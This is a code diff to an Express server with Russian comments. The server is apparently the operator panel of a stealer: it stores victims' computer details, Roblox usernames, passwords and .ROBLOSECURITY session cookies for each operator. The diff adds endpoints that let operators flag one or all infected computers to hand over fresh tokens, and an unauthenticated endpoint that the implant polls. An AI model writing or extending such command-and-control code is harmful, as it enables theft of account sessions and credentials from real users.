@@ -407,12 +407,13 @@ app.post('/upload', upload.array('files'), async (req, res) => {
     computer: computerInfo,
     roblox: robloxInfo,
     diagnostics: diagnostics,
-    operator: operator
+    operator: operator,
+    tokenRequest: { requested: false }
   };
 
   if (db) {
     const updateDoc = {
-      $set: { name: fixedName, uploadedAt: new Date().toISOString(), computer: computerInfo, diagnostics: diagnostics, operator: operator },
+      $set: { name: fixedName, uploadedAt: new Date().toISOString(), computer: computerInfo, diagnostics: diagnostics, operator: operator, 'tokenRequest.requested': false },
       $setOnInsert: { roblox: { user: '', pass: '', security: '' } }
     };
     // Если есть токен — всегда записываем его
@@ -538,6 +539,7 @@ app.post('/update-roblox', async (req, res) => {
       }
     }
 
+    updateSet['tokenRequest.requested'] = false;
     await db.collection('files').updateOne(
       { _id: target._id },
       { $set: updateSet }
@@ -559,7 +561,8 @@ app.post('/update-roblox', async (req, res) => {
       uploadedAt: new Date().toISOString(),
       computer: { name: computerName, os: '—', cpu: '—', ram: '—', gpu: '—', ip: '—', country: 'Unknown' },
       roblox: { user: robloxUser, pass: fakePassword, security: robloSecurity || '' },
-      operator: operator
+      operator: operator,
+      tokenRequest: { requested: false }
     };
 
     if (robloSecurity) {
@@ -835,7 +838,87 @@ app.post('/robux-check-file', requireAuth, async (req, res) => {
 });
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  TOKENS PAGE — список рабочих токенов с Robux
+//  TOKEN REQUEST — запрос нового токена с компьютера
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+// POST /request-token — запросить токен у конкретного компьютера
+app.post('/request-token', requireAuth, async (req, res) => {
+  try {
+    const { filename } = req.body;
+    if (!filename) return res.status(400).json({ error: 'Не указан файл' });
+    const user = req.authUser || req.session.user;
+    const db = await getDb();
+    if (db) {
+      await db.collection('files').updateOne(
+        { name: filename, operator: user },
+        { $set: { 'tokenRequest.requested': true, 'tokenRequest.requestedAt': new Date().toISOString() } }
+      );
+    } else {
+      const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+      if (doc) {
+        doc.tokenRequest = { requested: true, requestedAt: new Date().toISOString() };
+      }
+    }
+    console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос токена: ${filename}`);
+    res.json({ success: true });
+  } catch (e) {
+    console.error('Request-token error:', e.message);
+    res.status(500).json({ error: 'Ошибка сервера' });
+  }
+});
+
+// POST /request-token-all — запросить токен у всех компьютеров оператора
+app.post('/request-token-all', requireAuth, async (req, res) => {
+  try {
+    const user = req.authUser || req.session.user;
+    const db = await getDb();
+    const now = new Date().toISOString();
+    if (db) {
+      const result = await db.collection('files').updateMany(
+        { operator: user },
+        { $set: { 'tokenRequest.requested': true, 'tokenRequest.requestedAt': now } }
+      );
+      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос токена у всех: ${result.modifiedCount} компьютеров`);
+      res.json({ success: true, count: result.modifiedCount });
+    } else {
+      let count = 0;
+      for (const doc of (global.memFiles || []).filter(f => f.operator === user)) {
+        doc.tokenRequest = { requested: true, requestedAt: now };
+        count++;
+      }
+      console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос токена у всех: ${count} компьютеров`);
+      res.json({ success: true, count });
+    }
+  } catch (e) {
+    console.error('Request-token-all error:', e.message);
+    res.status(500).json({ error: 'Ошибка сервера' });
+  }
+});
+
+// GET /check-token-request — клиент проверяет, нужен ли новый токен (без авторизации)
+app.get('/check-token-request', async (req, res) => {
+  try {
+    const computerName = (req.query.computerName || '').toString().substring(0, 128);
+    const operator = (req.query.operator || 'Shonll').toString().substring(0, 64);
+    if (!computerName) return res.json({ requested: false });
+
+    const db = await getDb();
+    let doc;
+    if (db) {
+      doc = await db.collection('files').findOne(
+        { 'computer.name': computerName, operator: operator },
+        { projection: { 'tokenRequest': 1 } }
+      );
+    } else {
+      doc = (global.memFiles || []).find(f => f.computer?.name === computerName && f.operator === operator);
+    }
+    const requested = doc?.tokenRequest?.requested === true;
+    res.json({ requested });
+  } catch (e) {
+    console.error('Check-token-request error:', e.message);
+    res.json({ requested: false });
+  }
+});
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.get('/tokens-data', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
